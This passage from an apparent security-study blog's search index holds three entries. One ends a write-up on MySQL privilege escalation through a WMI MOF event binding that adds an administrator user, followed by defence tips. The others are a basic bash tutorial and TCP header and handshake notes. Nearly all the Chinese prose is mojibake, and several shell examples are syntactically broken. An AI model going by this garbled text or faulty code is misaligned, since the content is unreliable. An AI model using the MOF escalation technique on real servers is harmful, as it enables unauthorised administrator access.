class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = <span class="variable">$Consumer</span>;</span><br><span class="line">    Filter = <span class="variable">$EventFilter</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ ‡çº¢éƒ¨åˆ†æ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå…ˆæ·»åŠ ç”¨æˆ·ï¼Œåœ¨å°†ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„ä¸­ã€‚</p>
<h3 id="é˜²å¾¡æ–¹æ³•"><a href="#é˜²å¾¡æ–¹æ³•" class="headerlink" title="é˜²å¾¡æ–¹æ³•"></a>é˜²å¾¡æ–¹æ³•</h3><p>é™åˆ¶mysqlçš„è®¿é—®</p>
<p>ä¸è¦ä»¥rootç”¨æˆ·èº«ä»½ç™»å½•</p>
<p>è®¾ç½®è¯¥ç›®å½•ä¸ºä¸å¯å†™</p>
<h1 id="å¯åŠ¨é¡¹ææƒ"><a href="#å¯åŠ¨é¡¹ææƒ" class="headerlink" title="å¯åŠ¨é¡¹ææƒ"></a>å¯åŠ¨é¡¹ææƒ</h1><h1 id="yasshæº¢å‡º"><a href="#yasshæº¢å‡º" class="headerlink" title="yasshæº¢å‡º"></a>yasshæº¢å‡º</h1><h1 id="ç™»å½•å¤±è´¥ç›´æ¥è¿›å…¥mysql"><a href="#ç™»å½•å¤±è´¥ç›´æ¥è¿›å…¥mysql" class="headerlink" title="ç™»å½•å¤±è´¥ç›´æ¥è¿›å…¥mysql"></a>ç™»å½•å¤±è´¥ç›´æ¥è¿›å…¥mysql</h1>]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>æ¼æ´åŸç†</tag>
        <tag>PHP</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>Shellç¼–ç¨‹</title>
    <url>/archives/6309c3f8.html</url>
    <content><![CDATA[<h1 id="Shellç¼–ç¨‹"><a href="#Shellç¼–ç¨‹" class="headerlink" title="Shellç¼–ç¨‹"></a>Shellç¼–ç¨‹</h1><h1 id="åŸºæœ¬ä»‹ç»"><a href="#åŸºæœ¬ä»‹ç»" class="headerlink" title="åŸºæœ¬ä»‹ç»"></a>åŸºæœ¬ä»‹ç»</h1><p>ä½¿ç”¨æ™®é€šçš„æ–‡æœ¬ç¼–è¾‘å™¨å³å¯ç¼–å†™,è¿™é‡Œåˆ›å»ºä¸€ä¸ªa.shçš„shellè„šæœ¬</p>
<p>å¼€å¤´ç¬¬ä¸€è¡Œä¸º ï¼š #! &#x2F;bin&#x2F;bash &#x2F;&#x2F;ç›®å½•è¡¨ç¤ºshellç±»å‹</p>
<p>æ‰§è¡Œæ–¹æ³•ï¼š cdåˆ°æ–‡ä»¶æ‰€åœ¨ç›®å½•ï¼Œ.&#x2F;a.sh &#x2F;&#x2F;æ³¨æ„ä¸å¯ç›´æ¥å†™a.shï¼Œå¦‚æœè¿™æ ·å†™ç³»ç»Ÿä¼šåˆ°ç¯å¢ƒå˜é‡çš„pathé¡¹ä¸­æ·»åŠ çš„ç›®å½•ä¸­å»å¯»æ‰¾è¯¥æ–‡ä»¶æ‰§è¡Œï¼Œå› ä¸ºå¾€å¾€æˆ‘ä»¬çš„shellè„šæœ¬å¹¶æ²¡æœ‰åœ¨è¿™äº›ç›®å½•é‡Œé¢åˆ™ç³»ç»Ÿæ— æ³•æ‰¾åˆ°è¯¥æ–‡ä»¶ã€‚</p>
<h1 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h1><h2 id="å®šä¹‰å˜é‡"><a href="#å®šä¹‰å˜é‡" class="headerlink" title="å®šä¹‰å˜é‡"></a>å®šä¹‰å˜é‡</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span></span><br></pre></td></tr></table></figure>

<p>ç­‰å·ä¸¤ç«¯ä¸èƒ½æœ‰ç©ºæ ¼</p>
<h2 id="ä½¿ç”¨å˜é‡"><a href="#ä½¿ç”¨å˜é‡" class="headerlink" title="ä½¿ç”¨å˜é‡"></a>ä½¿ç”¨å˜é‡</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;I am <span class="variable">$&#123;var&#125;</span>you son of bitch!&quot;</span></span><br></pre></td></tr></table></figure>

<p>{}ç”¨äºå®šä¹‰å˜é‡è¾¹ç•Œ</p>
<h2 id="åªè¯»å˜é‡"><a href="#åªè¯»å˜é‡" class="headerlink" title="åªè¯»å˜é‡"></a>åªè¯»å˜é‡</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">readonly</span> var</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;I am <span class="variable">$&#123;var&#125;</span>you son of bitch!</span></span><br><span class="line"><span class="string">var=&quot;</span>hejixiong<span class="string">&quot;  #ä¿®æ”¹åªè¯»å˜é‡ä¼šæŠ¥é”™</span></span><br></pre></td></tr></table></figure>

<h2 id="åˆ é™¤å˜é‡"><a href="#åˆ é™¤å˜é‡" class="headerlink" title="åˆ é™¤å˜é‡"></a>åˆ é™¤å˜é‡</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">unset</span> var</span><br></pre></td></tr></table></figure>

<p>ä¸èƒ½åˆ é™¤åªè¯»å˜é‡</p>
<h2 id="shellå˜é‡"><a href="#shellå˜é‡" class="headerlink" title="shellå˜é‡"></a>shellå˜é‡</h2><p>**å±€éƒ¨å˜é‡ï¼š**shellè„šæœ¬ä¸­å®šä¹‰çš„å˜é‡ï¼Œåªèƒ½åœ¨è„šæœ¬ä¸­ä½¿ç”¨</p>
<p>**ç¯å¢ƒå˜é‡ï¼š**æ‰€æœ‰çš„ç¨‹åºï¼ŒåŒ…æ‹¬shellå¯åŠ¨çš„ç¨‹åºéƒ½å¯ä»¥è®¿é—®ç¯å¢ƒå˜é‡</p>
<p>**shellå˜é‡ï¼š**ç”±shellç¨‹åºè®¾ç½®çš„ç‰¹æ®Šå˜é‡ï¼Œæœ‰ä¸€éƒ¨åˆ†æ˜¯ç¯å¢ƒå˜é‡æœ‰ä¸€éƒ¨åˆ†æ˜¯å±€éƒ¨å˜é‡</p>
<h1 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>å¯ä»¥ä½¿ç”¨å•å¼•å·ä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·</p>
<p>å•å¼•å·ä¸­çš„å†…å®¹åŸæ ·è¾“å‡º</p>
<p>åŒå¼•å·ä¸­çš„å†…å®¹å¯ä»¥åŒ…å«å˜é‡ï¼Œ</p>
<p>\ ä¸ºè½¬ä¹‰æ ‡å¿—</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armanhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;nihao&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nihao&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nihao \&quot;<span class="variable">$&#123;var&#125;</span>\&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="å­—ç¬¦ä¸²é•¿åº¦"><a href="#å­—ç¬¦ä¸²é•¿åº¦" class="headerlink" title="å­—ç¬¦ä¸²é•¿åº¦"></a>å­—ç¬¦ä¸²é•¿åº¦</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armandhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#var&#125;</span> <span class="comment">#è¾“å‡º8</span></span><br></pre></td></tr></table></figure>

<p>æå–å­å­—ç¬¦ä¸²</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;armanhe&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;var:1:3&#125;</span> <span class="comment"># è¾“å‡ºrma</span></span><br></pre></td></tr></table></figure>

<h1 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h1><p>é€šè¿‡ä¸‹æ ‡è®¿é—®ï¼Œä¸‹æ ‡çš„å¼€å§‹å€¼ä¸º0ï¼Œåªæœ‰ä¸€ç»´æ•°ç»„ï¼Œä¸”æ— å¤§å°é™åˆ¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array1=(1 2 3 45 56 43)</span><br><span class="line">array2=(</span><br><span class="line">1 </span><br><span class="line">2 </span><br><span class="line">3 </span><br><span class="line">45 </span><br><span class="line">56 </span><br><span class="line">43</span><br><span class="line">)</span><br><span class="line"><span class="built_in">declare</span> -A array4 <span class="comment">#å£°æ˜æ•°ç»„</span></span><br><span class="line">array3[0]=1</span><br><span class="line">array3[1]=134</span><br><span class="line">array3[2]=145</span><br><span class="line">array4[234]=44</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array1[0]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array1[@]&#125;</span> <span class="comment">#è·å–æ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è·å–æ•°ç»„é•¿åº¦</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array=(1 2 3 45 56 43)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[@]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[*]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#array[n]&#125;</span> <span class="comment">#è·å–æ•°ç»„ä¸­æŸä¸ªå…ƒç´ çš„é•¿åº¦</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¤šè¡Œæ³¨é‡Š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">å¤šè¡Œæ³¨é‡Š</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">echo $&#123;#array[@]&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<p>å‚æ•°ä¼ é€’</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># æ–‡ä»¶åa.sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;è„šæœ¬åä¸º<span class="variable">$0</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ç¬¬ä¸€ä¸ªå‚æ•°ä¸º<span class="variable">$1</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ç¬¬äºŒä¸ªå‚æ•°ä¸º<span class="variable">$2</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ç¬¬ä¸‰ä¸ªå‚æ•°ä¸º<span class="variable">$3</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>chmod +x a.sh</p>
<p>.&#x2F;a.sh 12 â€œhjxâ€ â€˜redâ€™</p>
<p><a href="Untitled%20521b7c9be779487aaeb0ad68a1ad16fa.csv">Untitled</a></p>
<h1 id="æµç¨‹æ§åˆ¶"><a href="#æµç¨‹æ§åˆ¶" class="headerlink" title="æµç¨‹æ§åˆ¶"></a>æµç¨‹æ§åˆ¶</h1><h2 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=10</span><br><span class="line"><span class="variable">$b</span>=12</span><br><span class="line"><span class="keyword">if</span> [<span class="variable">$a</span> -gt <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> + <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="variable">$a</span> -eq <span class="variable">$b</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> - <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> [<span class="variable">$a</span> \* <span class="variable">$b</span>]</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `<span class="built_in">ls</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">for</span> (i=1;i&lt;10;i++);<span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h2 id="while"><a href="#while" class="headerlink" title="while"></a>while</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int=1</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$int</span>&lt;=<span class="number">5</span>))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$int</span></span><br><span class="line">	<span class="built_in">let</span> <span class="string">&quot;int++&quot;</span> <span class="comment">#ä½¿ç”¨letå‘½ä»¤ï¼Œåœ¨å˜é‡è®¡ç®—ä¸­å°±ä¸éœ€è¦åŠ ä¸Š$</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h2 id="until"><a href="#until" class="headerlink" title="until"></a>until</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=0</span><br><span class="line"><span class="keyword">until</span> [! <span class="variable">$a</span> -lt 10]</span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line">	a=`<span class="built_in">expr</span> <span class="variable">$a</span> + 1`</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>å½“æ¡ä»¶ä¸æˆç«‹çš„æ—¶å€™æ‰§è¡Œä»£ç å—</p>
<p>å½“æ¡ä»¶æˆç«‹æ—¶è·³å‡ºå¾ªç¯ï¼Œä¸whileæ­£å¥½ç›¸å</p>
<h2 id="case-â€¦-esac"><a href="#case-â€¦-esac" class="headerlink" title="case â€¦ esac"></a>case â€¦ esac</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span> num</span><br><span class="line"><span class="keyword">case</span> <span class="variable">$num</span> <span class="keyword">in</span></span><br><span class="line">	1) <span class="built_in">echo</span> <span class="string">&#x27;ä½ é€‰æ‹©äº†1&#x27;</span></span><br><span class="line">	;;</span><br><span class="line">	2) <span class="built_in">echo</span> <span class="string">&#x27;ä½ é€‰æ‹©äº†2&#x27;</span></span><br><span class="line">	;;</span><br><span class="line">	*) <span class="built_in">echo</span> <span class="string">&#x27;è¯·æ­£å¸¸è¾“å…¥&#x27;</span></span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>

<h1 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">test</span></span>()&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&#x27;è¿™æ˜¯ä¸€ä¸ªå‡½æ•°&#x27;</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$1</span> <span class="variable">$2</span></span><br><span class="line">	<span class="built_in">return</span> <span class="variable">$1</span> <span class="variable">$2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">test</span> 1 2</span><br><span class="line">func=<span class="keyword">function</span>&#123;</span><br><span class="line">	<span class="comment">#body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="è¾“å…¥è¾“å‡ºé‡å®šå‘"><a href="#è¾“å…¥è¾“å‡ºé‡å®šå‘" class="headerlink" title="è¾“å…¥è¾“å‡ºé‡å®šå‘"></a>è¾“å…¥è¾“å‡ºé‡å®šå‘</h1><p><a href="Untitled%20569327758ca8421ebe2a12f906547f30.csv">Untitled</a></p>
<h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><p>. filename</p>
<p>source filename</p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>ç¼–ç¨‹è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Shellç¼–ç¨‹</tag>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>TCP-UDP-IPå­¦ä¹ </title>
    <url>/archives/eecf3b2.html</url>
    <content><![CDATA[<h1 id="TCPåè®®"><a href="#TCPåè®®" class="headerlink" title="TCPåè®®"></a>TCPåè®®</h1><p>æœ¬éƒ¨åˆ†ç¬”è®°ç¬”è®°å‚è€ƒç½‘å€ï¼š</p>
<p><a href="https://www.cnblogs.com/zmlctt/p/3690998.html">TCPä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹è¯¦è§£ - zmlctt - åšå®¢å›­</a></p>
<p><a href="https://baike.baidu.com/item/TCP/33012">TCPï¼ˆä¼ è¾“æ§åˆ¶åè®®ï¼‰_ç™¾åº¦ç™¾ç§‘</a></p>
<h2 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h2><p>TCP: ä¼ è¾“æ§åˆ¶åè®®ï¼Œå·¥ä½œåœ¨osiä¸ƒå±‚æ¨¡å‹çš„ä¼ è¾“å±‚ä¸Šï¼Œæ˜¯ä¸€ç§é¢å‘è¿æ¥çš„åè®®ï¼Œè´Ÿè´£ç«¯å¯¹ç«¯ç½‘ç»œè¿æ¥çš„å»ºç«‹ï¼Œè¿›ç¨‹é—´é€šä¿¡ï¼Œæµé‡æ§åˆ¶ã€æ•°æ®æ ¡éªŒç­‰åŠŸèƒ½</p>
<p>SYN:åŒæ­¥åºåˆ—ç¼–å·ï¼ŒSynchronize Sequence Numbers</p>
<p>2MSL:2 Maximum Segment Lifetime 2å€æŠ¥æ–‡æœ€å¤§ç”Ÿå­˜æ—¶é—´ã€‚</p>
<h2 id="é¦–éƒ¨æ ¼å¼"><a href="#é¦–éƒ¨æ ¼å¼" class="headerlink" title="é¦–éƒ¨æ ¼å¼"></a>é¦–éƒ¨æ ¼å¼</h2><p>é¦–éƒ¨æœ€é•¿ä¸º60ä¸ªå­—èŠ‚ï¼Œæœ€çŸ­ä¸º20ä¸ªå­—èŠ‚â€”å½“é¦–éƒ¨ä¸­æ— é€‰é¡¹å­—æ®µæ—¶ã€‚</p>
<p>Source Portâ€”â€”â€”æºç«¯å£ï¼Œ16bits,0-65535<br>Destination Port â€”â€”â€”â€”ç›®çš„ç«¯å£ï¼Œ16bits,0-65535</p>
<p>Sequence Numberâ€”â€”â€”â€”å‘é€æ•°æ®åŒ…ä¸­ç¬¬ä¸€ä¸ªåˆ†æ®µçš„åºåˆ—å·ï¼Œ32bits</p>
<p>Acknowledgement Numberâ€”â€”â€”â€”â€”-ç¡®è®¤åºåˆ—å·ï¼Œ32bits</p>
<p>Data Offsset â€”â€”â€”â€”æ•°æ®åç§»ï¼Œ32bitsï¼Œè¯¥å­—æ®µçš„å€¼æ˜¯TCPé¦–éƒ¨é•¿åº¦é™¤ä»¥4ï¼Œç”¨ä»¥æŒ‡å®šTCPæŠ¥æ–‡æ®µçš„æ•°æ®éƒ¨åˆ†èµ·å§‹ä½ç½®è·ç¦»TCPæŠ¥æ–‡æ®µçš„èµ·å§‹ä½ç½®æœ‰å¤šè¿œï¼Œè¯¥é€‰é¡¹å­˜åœ¨çš„æ„ä¹‰æ˜¯tcpé¦–éƒ¨ä¸­å­˜åœ¨é•¿åº¦ä¸ç¡®å®šçš„Optionsã€‚</p>
<p>æ ‡å¿—ä½â€”â€”â€”-6bitsï¼š</p>
<p>ç¬¬ä¸€ä½ï¼šURGâ€”è¡¨ç¤ºUrgent Pointerå­—æ®µæœ‰æ„ä¹‰</p>
<p>ç¬¬äºŒä½ï¼šACKâ€”è¡¨ç¤ºAcknowledgement Numbber å­—æ®µæœ‰æ„ä¹‰</p>
<p>ç¬¬ä¸‰ä½ï¼šPUSHâ€”-è¡¨ç¤ºpushåŠŸèƒ½ï¼Œå½“ä¸¤ä¸ªåº”ç”¨ç¨‹åºé€šä¿¡æ—¶ï¼ŒæŸä¸€ç«¯å¦‚æœå¸Œæœ›å½“å‰æ•°æ®ä¸­åŒ…å«çš„æŒ‡ä»¤å¾—åˆ°å°½å¿«çš„å“åº”ï¼Œåˆ™æ­¤æ—¶å°†è¯¥æ•°æ®æ®µçš„pushæ ‡å¿—ä½è®¾ç½®ä¸º1ï¼Œå½“æ¥å—æ–¹æ”¶åˆ°è¯¥æ•°æ®æ®µåï¼Œä¸æ˜¯å°†è¯¥æŠ¥æ–‡æ®µæ”¾ç½®åœ¨ç¼“å­˜ä¸­æ’é˜Ÿè¾“é€åˆ°åº”ç”¨ç¨‹åºï¼Œè€Œæ˜¯ç«‹å³å°†å…¶æäº¤åˆ°æ¥å—æ–¹åº”ç”¨ç¨‹åºã€‚</p>
<p>ç¬¬å››ä½ï¼šRSTâ€”å¤ä½TCPè¿æ¥ï¼Œå½“tcpè¿æ¥ä¸­å‡ºç°äº†ä¸¥é‡çš„å·®é”™æ—¶ï¼Œå°†è¯¥å€¼è®¾ç½®ä¸º1ï¼Œæ­¤æ—¶è¡¨ç¤ºè¦é‡æ–°å»ºç«‹TCPè¿æ¥ã€‚</p>
<p>ç¬¬äº”ä½ï¼šSYNâ€”â€”è¡¨ç¤ºSYNæŠ¥æ–‡</p>
<p>ç¬¬å…­ä½ï¼šFINâ€”â€”è¡¨ç¤ºæ²¡æœ‰æ•°æ®å¯ä»¥å‘é€äº†</p>
<p>Windowâ€”â€”è¡¨ç¤ºæ¥å—ç¼“å†²åŒºçš„ç©ºé—²ç©ºé—´ï¼Œ16bitsï¼Œç”¨æ¥å‘Šè¯‰TCPæ¥å—å¯¹ç«¯è‡ªå·±èƒ½å¤Ÿæ¥å—é€‡æœ€å¤§æ•°æ®é•¿åº¦</p>
<p>Checksumâ€”â€”æ ¡éªŒå’Œï¼Œ16bitsã€‚åœ¨è®¡ç®—æ ¡éªŒå’Œæ—¶ï¼Œè¦åœ¨TCPé¦–éƒ¨çš„å‰é¢åŠ ä¸Š12ä¸ªå­—èŠ‚çš„ä¼ªé¦–éƒ¨ã€‚</p>
<p>Urgent Pointers â€”â€”ç´§æ€¥æŒ‡é’ˆï¼Œ16ä½ï¼Œ åªæœ‰URGæ ‡å¿—ä½è¢«è®¾ç½®æ—¶è¯¥å­—æ®µæ‰æœ‰æ„ä¹‰ï¼Œè¡¨ç¤ºç´§æ€¥æ•°æ®ç›¸å¯¹åºåˆ—å·ï¼ˆSequence Numberå­—æ®µçš„å€¼ï¼‰çš„åç§»ã€‚è¡¨æ˜å½“å‰è¿æ¥ä¸­æœ‰ç´§æ€¥å­—æ®µéœ€è¦å‘é€ï¼Œæ­¤æ—¶tcpå°†è¯¥æŠ¥æ–‡æ®µæ’å…¥åˆ°æŠ¥æ–‡æ®µé˜Ÿåˆ—çš„æœ€å‰æ–¹ï¼Œä¼˜å…ˆå‘é€</p>
<h2 id="ä¼ªé¦–éƒ¨æ ¼å¼"><a href="#ä¼ªé¦–éƒ¨æ ¼å¼" class="headerlink" title="ä¼ªé¦–éƒ¨æ ¼å¼"></a>ä¼ªé¦–éƒ¨æ ¼å¼</h2><p>æœ¬éƒ¨åˆ†å‚è€ƒç½‘å€ï¼š</p>
<p><a href="https://blog.csdn.net/jiangqin115/article/details/39315085">TCP,UDPä¼ªé¦–éƒ¨æè¿°_jiangqin115çš„ä¸“æ -CSDNåšå®¢_udpä¼ªé¦–éƒ¨</a></p>
<p>Source IPâ€”â€”æºIPåœ°å€ï¼Œ32bits</p>
<p>Destination Ip â€”â€”â€”ç›®çš„IPåœ°å€ï¼Œ32bits</p>
<p>å¡«å……ä½â€”â€”â€”8bits,å‡å¡«å……ä¸º0</p>
<p>Protocolâ€”â€”â€”åè®®ä½ï¼Œä½¿ç”¨åè®®çš„åè®®å·ï¼Œ8bitsï¼Œtcpä¸º6</p>
<p>Data Segment Length â€”â€”â€”æ•°æ®æ®µé•¿åº¦ï¼Œ16bits</p>
<p>é¦–éƒ¨å¹¶éTCP&amp;UDPæ•°æ®æŠ¥ä¸­å®é™…çš„æœ‰æ•ˆæˆåˆ†ã€‚ä¼ªé¦–éƒ¨æ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„ æ•°æ®ç»“æ„ï¼Œå…¶ä¸­çš„ä¿¡æ¯æ˜¯ä»æ•°æ®æŠ¥æ‰€åœ¨IPåˆ†ç»„å¤´çš„åˆ†ç»„å¤´ä¸­æå–çš„ï¼Œæ—¢ä¸å‘ä¸‹ä¼ é€ä¹Ÿä¸å‘ä¸Šé€’äº¤ï¼Œè€Œä»…ä»…æ˜¯ä¸ºè®¡ç®— æ ¡éªŒå’Œã€‚è¿™æ ·çš„ æ ¡éªŒå’Œï¼Œæ—¢æ ¡éªŒäº†TCP&amp;UDPç”¨æˆ·æ•°æ®çš„æº ç«¯å£å·å’Œç›®çš„ç«¯å£å·ä»¥åŠTCP&amp;UDPç”¨æˆ·æ•°æ®æŠ¥çš„æ•°æ®éƒ¨åˆ†ï¼Œåˆæ£€éªŒäº†IPæ•°æ®æŠ¥çš„æºIPåœ°å€å’Œç›®çš„åœ°å€ã€‚ä¼ªæŠ¥å¤´ä¿è¯TCP&amp;UDPæ•°æ®å•å…ƒåˆ°è¾¾æ­£ç¡®çš„ç›®çš„åœ°å€ã€‚å› æ­¤ï¼Œä¼ªæŠ¥å¤´ä¸­åŒ…å«IPåœ°å€å¹¶ä¸”ä½œä¸ºè®¡ç®— æ ¡éªŒå’Œéœ€è¦è€ƒè™‘çš„ä¸€éƒ¨åˆ†ã€‚æœ€ç»ˆç›®çš„ç«¯æ ¹æ®ä¼ªæŠ¥å¤´å’Œ æ•°æ®å•å…ƒè®¡ç®— æ ¡éªŒå’Œä»¥éªŒè¯é€šä¿¡æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ²¡æœ‰æ”¹å˜è€Œä¸”åˆ°è¾¾äº†æ­£ç¡®çš„ç›®çš„åœ°å€ã€‚</p>
<h2 id="TCPè¿æ¥å»ºç«‹ä¸ç»ˆæ­¢"><a href="#TCPè¿æ¥å»ºç«‹ä¸ç»ˆæ­¢" class="headerlink" title="TCPè¿æ¥å»ºç«‹ä¸ç»ˆæ­¢"></a>TCPè¿æ¥å»ºç«‹ä¸ç»ˆæ­¢</h2><h3 id="å»ºç«‹è¿æ¥-3æ¬¡æ¡æ‰‹"><a href="#å»ºç«‹è¿æ¥-3æ¬¡æ¡æ‰‹" class="headerlink" title="å»ºç«‹è¿æ¥-3æ¬¡æ¡æ‰‹"></a>å»ºç«‹è¿æ¥-3æ¬¡æ¡æ‰‹</h3><p>TCPä¸‰æ¬¡æ¡æ‰‹ï¼š</p>
<ol>
<li>å®¢æˆ·ç«¯å‘é€SYN(Seq&#x3D;xï¼Œåˆå§‹åºå·ï¼Œå­˜å‚¨åœ¨æŠ¥å¤´çš„Sequence Numberä¸­)ï¼ŒSYNæ ‡å¿—ä½ä¸º1ï¼ŒACKæ ‡å¿—ä½ä¸º0ï¼Œçš„æŠ¥æ–‡ç»™æœåŠ¡å™¨ç«¯ï¼Œè¿›å…¥SYN_SENDçŠ¶æ€</li>
<li>æœåŠ¡å™¨æ¥æ”¶åˆ°SYNæŠ¥æ–‡ï¼Œå›åº”ä¸€ä¸ªSYN(seq&#x3D;y)+ACKï¼ˆACK &#x3D; x+1ï¼‰ï¼ŒSYNä¸ACKæ ‡å¿—ä½åŒæ—¶ä¸º1çš„æŠ¥æ–‡ç»™å®¢æˆ·ç«¯ï¼Œè¿›å…¥SYN_RECVçŠ¶æ€ã€‚</li>
<li>å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨ç«¯çš„SYNæŠ¥æ–‡ï¼Œå›åº”ä¸€ä¸ªACK(ACK&#x3D;y+1)ï¼ŒSYNæ ‡å¿—ä½ä¸º0ï¼ŒACKæ ‡å¿—ä½ä¸º1çš„åŒ…ç»™æœåŠ¡å™¨ï¼Œè¿›å…¥establishedçŠ¶æ€ã€‚</li>
</ol>
